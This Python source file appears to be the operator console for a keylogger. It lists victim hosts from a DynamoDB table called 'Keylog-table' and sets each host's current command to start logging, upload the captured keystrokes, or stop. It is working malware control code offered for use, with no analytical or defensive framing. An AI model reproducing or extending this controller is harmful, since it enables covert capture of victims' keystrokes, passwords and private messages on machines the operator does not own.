import boto3
import os
import sys
from boto3.dynamodb.conditions import Key
from dotenv import load_dotenv


def main():

    load_dotenv()

    dynamodb = boto3.resource('dynamodb')

    items = pull_items(dynamodb)

    host_names = [item.get('hostName') for item in items if 'hostName' in item]

    os.system('cls' if os.name == 'nt' else 'clear')

    print('Host(s) available:')

    for name in host_names:
        print(f'{name}')

    print('\n')

    host_name = input('Select host(s): ')
    os.system('cls' if os.name == 'nt' else 'clear')

    host_names_lowercase = [item.lower() for item in host_names]

    while True:
        if host_name.lower() in host_names_lowercase:
            lookup = {name.lower(): name for name in host_names}
            host_name = lookup.get(host_name.lower())
            break
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Host not available\n")
            main()

    table = dynamodb.Table('Keylog-table')
    response = table.get_item(
        Key={'hostName': host_name}
    )

    item = response.get('Item')

    cmd = item['curr_cmd']

    select_cmds(host_name, dynamodb, cmd)
    os.system('cls' if os.name == 'nt' else 'clear')
    

def update_cmds(host_name, cmd, dynamodb):
    table = dynamodb.Table('Keylog-table')
    table.update_item(
        Key={'hostName': host_name},
        UpdateExpression='SET curr_cmd = :cmd',
        ExpressionAttributeValues={':cmd': cmd}
    )

def pull_items(dynamodb):
    table = dynamodb.Table('Keylog-table')

    response = table.scan()
    items = response.get('Items', [])

    return items

def select_cmds(host_name, dynamodb, cmd):
    print(f"Currently on host: {host_name} | Current cmd: {cmd}")
    while True:
        cmd = input('Enter cmd: Start | Upload | Stop | Reselect = ').strip().lower()
        
        if cmd == 'start':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'upload':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'stop':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'reselect':
            main()
        elif cmd == 'exit':
            sys.exit(0)
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print('ERROR - Misinput')

if __name__ == '__main__':
    main()